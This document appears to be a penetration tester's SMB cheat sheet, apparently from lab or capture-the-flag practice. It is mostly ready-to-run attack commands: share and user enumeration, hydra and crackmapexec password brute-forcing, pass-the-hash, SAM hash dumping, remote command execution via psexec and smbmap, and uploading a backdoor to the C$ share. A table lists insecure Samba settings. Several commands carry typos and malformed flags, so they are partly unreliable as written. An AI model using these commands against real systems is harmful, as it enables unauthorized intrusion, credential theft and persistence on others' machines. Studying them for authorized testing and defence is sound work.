# **SMB**

## **Server Message Block 445**

> net use * /delete

```bash
$ net use z: \\10.4.17.133\c$ smbserver_771 /user:administrator 

> | Username | Password | | administrator | smbserver_771 |
```

```shell
$ sudo systemctl restart smbd
$ smbstatus
```
```shell-session
smb: \> get prep-prod.txt 
smb: \> !ls
```


```shell-session
$ samrdump.py 10.129.14.128
```
--------------------------------------------------------------------

### Some scripts for nmap

```bash
$ nmap 0.0.0.0 -p 139,445 —script smb-os-discovery

$ nmap -p445 —script smb-protocols 0.0.0.0

$ nmap -p445 —script smb-security-mode 0.0.0.0

$ nmap -p445 —script smb-enum-sessions 0.0.0.0 

$ nmap -p445 —script smb-enum-sessions —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-shares 0.0.0.0 

$ nmap -p445 —script smb-vuln-ms17-010 0.0.0.0

$ nmap -p445 —script smb-enum-shares —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-users —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-stats —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-domains —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-groups —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-services —script-args username=administrator, password=smbserver_771 0.0.0.0

$ nmap -p445 —script smb-enum-shares,smb-ls —script-args username=administrator, password=smbserver_771 0.0.0.0
```

Some scripts will just work if SMBv1 is enabled on the target host. On modern days this is not a common thing but in some legacy hosts it is still enabled.

--------------------------------------------------------------------

### BRUTEFORCE

```bash
$ hydra -l admin -P /usr/shar/wordlists/rockyou.txt 0.0.0.0 smb
```
```shell
$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```


--------------------------------------------------------------------
#### Crackmapexec
```shell
$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
```shell
$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```
```shell
$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
#### Extract Hashes from SAM Database
```shell
$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
### smbmap

```bash
$ smbmap -u guest -p “” -d . -H 0.0.0.0

$ smbmap -H 0.0.0.0 -u administrator -p smbserver_771 -x ‘ipconfig’

$ smbmap -H 0.0.0.0 -u administrator -p ‘smbserver_771’ -L

$ smbmap -H 0.0.0.0 -u administrator -p ‘smbserver_771’ -r ‘C$’

$ smbmap -H 0.0.0.0 -u administrator -p ‘smbserver_771’ —upload ‘/root/backdoor’ ‘C$\backdoor’

$ smbmap -H 0.0.0.0 -u administrator -p ‘smbserver_771’ —downlaod ‘C$\flag.txt’

$ smbmap -H 0.0.0.0 -u admin -p password1
```
```shell
$ smbmap -H 10.129.14.128 --download "notes\note.txt"
```
```shell
$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```
Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:

--------------------------------------------------------------------

### smbclient

```shell
$ smbclient -N -L //10.129.14.128
```

```shell
smbclient //10.129.14.128/notes
```

```bash
$ smbclient -L 0.0.0.0 -N  (-N = No pass) —> anonymous session allowed?

$ smbclient //0.0.0.0/Public -N
> ls
> cd secret
> get flag

$ smb client -L 0.0.0.0 -U jane
> password

$ smbclient //0.0.0.0/jane -U jane 
> password
```

--------------------------------------------------------------------

### enum4linux

```shell
$ git clone https://github.com/cddmp/enum4linux-ng.git
$ cd enum4linux-ng
$ pip3 install -r requirements.txt
```

```shell
$ ./enum4linux-ng.py 10.129.14.128 -A
```

```bash
$ enum4linux -o 0.0.0.0

$ enum4linux -U 0.0.0.0 (Users)

$ enum4linux -S 0.0.0.0 (Shares)

$ enum4linux -G 0.0.0.0 (Groups)

$ enum4linux -i 0.0.0.0 (Info)

$ enum4linux -r -u “admin” -p “password1”

$ enum4linux -u vagrant -p vagrant -U 0.0.0.0
```
```shell
$ ./enum4linux-ng.py 10.10.11.45 -A -C
```

--------------------------------------------------------------------

## rpcclient

```bash
$ rpcclient -U “” -N 0.0.0.0 (blank user and no pass) —> anonymous session allowed?

$ rpcclient U "" 10.129.14.128
```

#### Impacket PsExec
```shell
$ impacket-psexec -h
```
```shell
$ impacket-psexec administrator:'Password123!'@10.10.110.17
```
The same options apply to `impacket-smbexec` and `impacket-atexec`.


#### rpcclient Commands

The rpcclient offers many different requests to execute specific functions on the SMB server to gather information. A complete list of these functions can be found in the rpcclient man page.

| Query                     | Description                                                        |
| ------------------------- | ------------------------------------------------------------------ |
| `srvinfo`                 | Server information.                                                |
| `enumdomains`             | Enumerate all domains deployed in the network.                     |
| `querydominfo`            | Provides domain, server, and user information of deployed domains. |
| `netshareenumall`         | Enumerates all available shares.                                   |
| `netsharegetinfo <share>` | Provides information about a specific share.                       |
| `enumdomusers`            | Enumerates all domain users.                                       |
| `queryuser <RID>`         | Provides information about a specific user.                        |
| `querygroup <RID>`        |                                                                    |

## RID  Bruteforcing:

```shell
$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
--------------------------------------------------------------------

### Metasploit Enumeration

```bash
$ msfconsole

use auxiliary/scanner/smb/smb_version

use auxiliary/scanner/smb/smb2 (see if is vulnerable)

use auxiliary/scanner/smb/smb_enumshares

use /auxiliary/scanner/smb/smb_login
>set passwordlist, user and host

use auxiliary/scanner/smb/pipe_auditor
>set user, pass and host
```

--------------------------------------------------------------------

### nmblookup

```bash
$ nmblookup -A 0.0.0.0
```


# Configuration:

```shell
$ cat /etc/samba/smb.conf | grep -v "#\|\;" 
```

### Samba Configuration Settings

| Setting                          | Description |
|----------------------------------|-------------|
| `[sharename]`                    | The name of the network share. |
| `workgroup = WORKGROUP/DOMAIN`   | Workgroup that will appear when clients query. |
| `path = /path/here/`             | The directory to which user is to be given access. |
| `server string = STRING`         | The string that will show up when a connection is initiated. |
| `unix password sync = yes`       | Synchronize the UNIX password with the SMB password? |
| `usershare allow guests = yes`   | Allow non-authenticated users to access defined share? |
| `map to guest = bad user`        | What to do when a user login request doesn't match a valid UNIX user? |
| `browseable = yes`               | Should this share be shown in the list of available shares? |
| `guest ok = yes`                 | Allow connecting to the service without using a password? |
| `read only = yes`                | Allow users to read files only? |
| `create mask = 0700`             | What permissions need to be set for newly created files? |

### Dangerous Settings:

| Setting                        | Description |
|--------------------------------|-------------|
| `browseable = yes`             | Allow listing available shares in the current share? |
| `read only = no`               | Forbid the creation and modification of files? |
| `writable = yes`               | Allow users to create and modify files? |
| `guest ok = yes`               | Allow connecting to the service without using a password? |
| `enable privileges = yes`      | Honor privileges assigned to specific SID? |
| `create mask = 0777`           | What permissions must be assigned to newly created files? |
| `directory mask = 0777`        | What permissions must be assigned to newly created directories? |
| `logon script = script.sh`     | What script needs to be executed on the user's login? |
| `magic script = script.sh`     | Which script should be executed when the script gets closed? |
| `magic output = script.out`    | Where should the output of the magic script be stored? |

## FOR WINDOWS:
```powershell
net view \\dc01 /all
```
>/all keyword lists administrative shares ending with the $ sign.



